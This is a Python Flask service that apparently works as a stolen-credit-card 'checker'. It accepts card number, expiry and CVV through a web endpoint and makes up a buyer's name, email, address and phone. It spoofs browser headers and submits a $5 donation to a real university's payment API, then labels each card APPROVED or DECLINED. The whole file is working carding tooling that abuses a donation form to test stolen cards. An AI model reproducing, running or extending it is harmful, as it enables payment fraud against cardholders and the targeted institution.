import requests
import re
import time
import random
import string
import json
import base64
from flask import Flask, request
from user_agent import generate_user_agent
from faker import Faker

app = Flask(__name__)

fake = Faker()

def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip, phone

def check_card(num: str, mm: str, yy: str, cvv: str):
    time.sleep(3)
    r = requests.Session()
    u = generate_user_agent()

    email, name, add, city, zip, phone = gdata()

    headers = {
        'authority': 'payment.wallawalla.edu',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://payment.wallawalla.edu',
        'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': u,
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'items': [
            {
                'designation_setid': 'SHARE',
                'designation': 'SMSUMMER',
                'data': 'Tommy',
                'amount': '5',
                'anonymous': False,
            },
        ],
        'item_type': 'donation',
        'add_plan': False,
        'is_recurring': False,
        'metadata': {
            'paper_receipt_requested': False,
            'comments': 'Welson',
        },
        'payment_method': 'cc',
        'first_name': name,
        'last_name': name,
        'phone': phone,
        'email': email,
        'street1': add,
        'city': city,
        'state': 'NY',
        'postal': zip,
        'country': 'US',
        'card_number': num,
        'expiration_month': mm,
        'expiration_year': yy,
        'cv_number': cvv,
        'save_information': False,
        'account_nickname': '',
    }

    response = r.post(
        'https://payment.wallawalla.edu/api/v1/validate/transaction',
        cookies=r.cookies,
        headers=headers,
        json=json_data,
    )

    try:
        data = response.json()
        tras = data['transaction']
    except:
        return "DECLINED", response.text

    headers = {
        'authority': 'payment.wallawalla.edu',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://payment.wallawalla.edu',
        'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': u,
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'transaction': tras,
        'ach_authorization': False,
    }

    response = r.post('https://payment.wallawalla.edu/api/v1/pay', cookies=r.cookies, headers=headers, json=json_data)

    try:
        msg = response.json()['message']
        if "declined" in msg.lower() or "decline" in msg.lower():
            return "DECLINED", msg
        else:
            return "APPROVED", msg
    except:
        return "DECLINED", response.text

@app.route('/donate', methods=['GET'])
def donate():
    card_param = request.args.get('card')
    if not card_param:
        return "ERROR: card parametresi eksik", 400

    try:
        parts = [p.strip() for p in card_param.split('|')]
        if len(parts) != 4:
            return "ERROR: Format hatalı → card=NUM|MM|YY|CVV", 400

        num, mm, yy, cvv = parts
        result, full_response = check_card(num, mm, yy, cvv)

        output = f"{num}|{mm}|{yy}|{cvv} | {result} | @c4rdable\n\n"

        return output, 200, {'Content-Type': 'text/plain; charset=utf-8'}

    except Exception as e:
        return f"ERROR: {str(e)}", 500

@app.route('/health', methods=['GET'])
def health():
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
